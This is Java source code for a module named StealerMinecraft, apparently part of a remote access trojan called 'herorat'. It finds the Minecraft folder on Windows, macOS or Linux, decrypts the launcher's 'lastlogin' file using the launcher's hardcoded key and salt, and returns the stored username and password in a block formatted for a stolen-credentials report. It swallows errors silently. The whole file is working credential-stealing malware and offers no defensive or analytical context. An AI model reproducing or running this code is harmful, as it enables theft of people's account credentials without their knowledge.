package net.herorat.features.stealer;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;

public class StealerMinecraft
{
	public static String getLogin()
	{
		try
		{
			Random random = new Random(43287234L);
			byte[] salt = new byte[8];
			random.nextBytes(salt);
			PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, 5);
			SecretKey pbeKey = SecretKeyFactory.getInstance("PBEWithMD5AndDES").generateSecret(new PBEKeySpec("passwordfile".toCharArray()));
			Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
			cipher.init(2, pbeKey, pbeParamSpec);
			File passFile = new File(getMinecraftDir(), "lastlogin");
			DataInputStream dis = null;
			dis = new DataInputStream(new CipherInputStream(new FileInputStream(passFile), cipher));
			
			StringBuffer buffer = new StringBuffer();
			buffer.append("--------- Minecraft ---------\n");
			buffer.append("Username: " + dis.readUTF());
			buffer.append("\nPassword: " + dis.readUTF());
			buffer.append("\n-----------------------------\n\n");
			
			dis.close();
			
			return buffer.toString();
		}
		catch (Exception e) {}
		
		return "";
	}
	
	public static File getMinecraftDir()
	{
		String os = System.getProperty("os.name", "").toLowerCase();
		String home = System.getProperty("user.home", ".");

		if (os.contains("win"))
		{
			String appdata = System.getenv("APPDATA");
			if (appdata != null)
			{
				return new File(appdata, ".minecraft");
			}
			else
			{
				return new File(home, ".minecraft");
			}
		}
		else if (os.contains("mac"))
		{
			return new File(home, "Library/Application Support/minecraft");
		}
		else
		{
			return new File(home, ".minecraft/");
		}
	}
}